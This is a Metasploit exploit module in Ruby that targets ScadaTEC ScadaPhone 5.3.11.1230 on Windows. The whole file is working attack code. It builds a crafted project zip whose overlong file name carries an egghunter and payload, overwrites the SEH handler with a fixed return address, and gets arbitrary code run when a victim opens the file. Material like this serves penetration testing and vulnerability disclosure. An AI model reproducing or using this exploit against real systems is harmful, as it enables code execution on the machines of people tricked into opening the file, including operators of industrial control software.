##
# $Id: scadaphone_zip.rb 13728 2011-09-13 20:10:28Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ScadaTEC ScadaPhone <= v5.3.11.1230 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow vulnerability in
				version 5.3.11.1230 of scadaTEC's ScadaPhone.

				In order for the command to be executed, an attacker must convince someone to
				load a specially crafted project zip file with ScadaPhone.
				By doing so, an attacker can execute arbitrary code as the victim user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'mr_me <steventhomasseeley[at]gmail.com>', # found + msf
				],
			'Version'        => '$Revision: 13728 $',
			'References'     =>
				[
					#[ 'CVE', '' ],
					[ 'OSVDB', '75375' ],
					[ 'URL', 'http://www.scadatec.com/' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/17817/' ],
				],
         		'Platform'          => [ 'win' ],
         		'Payload'           =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x0a\x0d",
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					# POP ESI; POP EBX; RETN [ScadaPhone.exe]
					[ 'Windows Universal', { 'Ret' => 0x004014F4 } ],
				],
			'DisclosureDate' => 'Sep 12 2011',
			'DefaultTarget'  => 0))

			register_options(
		 	[
				OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),
			], self.class)

	end

	def exploit

		eggoptions = 
		{
			:checksum => false,
			:eggtag => 'zipz' 
		}

		hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

		fname = rand_text_alpha_upper(229)
		fname << hunter
		fname << rand_text_alpha_upper(48-hunter.length)
		fname << Rex::Arch::X86.jmp_short(-50)
		fname << rand_text_alpha_upper(2)
		fname << [target.ret].pack('V')
		fname << rand_text_alpha_upper(100)
		fname << egg
		fname << rand_text_alpha_upper(4096-fname.length)
		fname << [0x7478741e].pack('V')

		zip = Rex::Zip::Archive.new
		xtra = [0xdac0ffee].pack('V')
		comment = [0xbadc0ded].pack('V')
		zip.add_file(fname, xtra, comment)

		# Create the file
		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(zip.pack)
	end

end
